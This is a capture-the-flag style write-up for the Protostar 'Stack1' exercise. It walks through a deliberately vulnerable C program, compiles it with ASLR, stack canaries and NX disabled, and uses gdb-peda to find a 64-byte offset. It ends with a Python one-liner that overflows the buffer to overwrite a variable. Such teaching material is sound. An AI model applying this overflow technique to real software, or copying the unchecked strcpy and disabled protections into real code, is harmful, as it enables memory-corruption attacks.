## Protostar-Stack1 Solution

### 1. Introduction

This is a poc solution for the "Stack1" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419031559/https://exploit-exercises.com/protostar/stack1/](https://web.archive.org/web/20170419031559/https://exploit-exercises.com/protostar/stack1/) 

**Hints:**
* This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
* If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
* Protostar is little endian.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + without nx-bit + Disable canaries + Disable ASLR + for x86:


```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o 1 1.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Set intel syntax.
3. Disassemble the main function.

```nasm
$ gdb -q 1
Reading symbols from 1...
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
...
   0x0804924a <+84>:	call   0x80490a0 <strcpy@plt>
   0x0804924f <+89>:	add    esp,0x10
   0x08049252 <+92>:	mov    eax,DWORD PTR [ebp-0x1c]
=> 0x08049255 <+95>:	cmp    eax,0x61626364
   0x0804925a <+100>:	jne    0x8049270 <main+122>
...
```
Instructions shared above are quite interesting...
Uses strcpy, compares the value **"0x61626364"** and then jumps to address ***0x8049270** if it does not equal to the value on **eax** register.

Let's keep this one in our mind...
> 0x61626364

After an initial execution it's possible to understand it needs an argument from the terminal.

```js
$ ./1
1: please specify an argument
```

#### 2.2 Quick Solution

Let's set a breakpoint to address "0x08049252" then check what is there. 
```nasm
gdb-peda$ b *0x08049252
Breakpoint 1 at 0x8049252: file 1.c, line 18.
gdb-peda$ r AAAAAAAA
Starting program: /1 AAAAAAAA
[----------------------------------registers-----------------------------------]
EAX: 0xffffd0dc ("AAAAAAAA")
EBX: 0x804c000 --> 0x804bf14 --> 0x1 
ECX: 0xffffd3ac ("AAAAAAAA")
EDX: 0xffffd0dc ("AAAAAAAA")
ESI: 0xffffd150 --> 0x2 
EDI: 0xf7fb0000 --> 0x1ead6c 
EBP: 0xffffd138 --> 0x0 
ESP: 0xffffd0d0 --> 0x0 
EIP: 0x8049252 (<main+92>:	mov    eax,DWORD PTR [ebp-0x1c])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[...DELETED...]

Breakpoint 1, main (argc=0x2, argv=0xffffd1e4) at 1.c:18
18	  if(modified == 0x61626364) {
```

> Since we compiled with debug symbols and we use peda, it's very easy to see...

So it checks if the value modified equals to **"0x61626364"** or not.

```x86asm
gdb-peda$ p/d 0x61
$32 = 97
gdb-peda$ p/d 0x62
$33 = 98
gdb-peda$ p/d 0x63
$34 = 99
gdb-peda$ p/d 0x64
$35 = 100
```
ASCII equivalent is **"dcba" (100 99 98 97)**. So we can send some kind of following payload:
[offset]+dcba or hex equivalent.

Run the binary again and let's see what happens:

```nasm
   0x0804924f <+89>:	add    esp,0x10
=> 0x08049252 <+92>:	mov    eax,DWORD PTR [ebp-0x1c]
   0x08049255 <+95>:	cmp    eax,0x61626364
```

Let's run it again then check what we have in that place **(ebp-0x1c)** with the following commands.

```nasm
gdb-peda$ r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNPPPPOOOOXXXX
..trim..
gdb-peda$ x/wx $ebp-0x1c
0xffffd0ec:	0x58585858
```

To let this solution post shorter I didn't want to do same steps multiple times. So, we found our offset:
```x86asm
gdb-peda$ python-interactive print(len('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNPPPPOOOOXXXX')-4)
64
```

**esp dump:**
```nasm
gdb-peda$ x/20xw $esp
0xffffd0a0:	0x00000000	0x00000000	0xf7ffd000	0x41414141<=First(A)
0xffffd0b0:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd0c0:	0x46464646	0x47474747	0x48484848	0x49494949
0xffffd0d0:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
0xffffd0e0:	0x4e4e4e4e	0x50505050	0x4f4f4f4f  *0x58585858<=Target

gdb-peda$ c
Continuing.
Try again, you got 0x58585858
[Inferior 1 (process 7941) exited normally]
Warning: not running
```

I put 2 arrows in the output of **x/20xw $esp** command above.

*First*: Stands for the starting point of our input.

*Target*: Stands for the target place that we want to manipulate.

Our offset length will be = Target-First = 64


#### 2.3 PoC in gdb-peda:

```nasm
gdb-peda$ r $(python2 -c 'print "\x90"*64 + "\x64\x63\x62\x61"')

gdb-peda$ print modified
$1 = 0x61626364

gdb-peda$ x/wx $ebp-0x1c
0xffffd0ec:	0x61626364

gdb-peda$ x/20xw $esp
0xffffd0a0:	0x00000000	0x00000000	0xf7ffd000	0x90909090
0xffffd0b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd0c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd0d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd0e0:	0x90909090	0x90909090	0x90909090	0x61626364

gdb-peda$ c
Continuing.
you have correctly got the variable to the right value
[Inferior 1 (process 8471) exited normally]
Warning: not running
```

#### 2.3 Final PoC

```bash
$ ./1 `python2 -c 'print "\x90"*64 + "\x64\x63\x62\x61"'` 
you have correctly got the variable to the right value
```
